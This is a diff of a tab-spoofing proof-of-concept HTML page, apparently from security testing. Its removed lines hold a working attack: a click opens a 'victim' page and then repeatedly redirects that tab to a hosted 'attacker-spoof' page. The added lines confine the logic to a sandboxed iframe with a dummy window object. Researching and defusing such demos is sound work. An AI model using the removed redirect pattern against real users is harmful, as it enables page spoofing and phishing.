@@ -1,18 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sandboxed Test</title>
+</head>
+<body>
+<h1>Click to test sandboxed spoofing</h1>
 
-<h1>click to open spoofed tab</h1>
+<iframe id="sandbox" sandbox="allow-scripts" style="width:0; height:0; border:none;"></iframe>
 
 <script>
-    document.body.onclick = () => {
-
-        const win = window.open('https://max-pay-nine.vercel.app/victim-poc.html');
-
-        const spoof = () => {
-            win.location.href = 'https://mrnoob790.github.io/attacker-spoof.html';
-        };
-
+document.body.onclick = () => {
+    // sandboxed iframe ke andar script execute hogi, par external tab open nahi hoga
+    const iframe = document.getElementById('sandbox');
+    iframe.srcdoc = `
+        <script>
+        const win = { location: { href: 'https://max-pay-nine.vercel.app/victim-poc.html' } };
+        const spoof = () => { win.location.href = 'https://mrnoob790.github.io/attacker-spoof.html'; };
         setTimeout(spoof, 100);
-
         setInterval(spoof, 2000);
-    }
+        <\/script>
+    `;
+};
 </script>
+</body>
+</html>
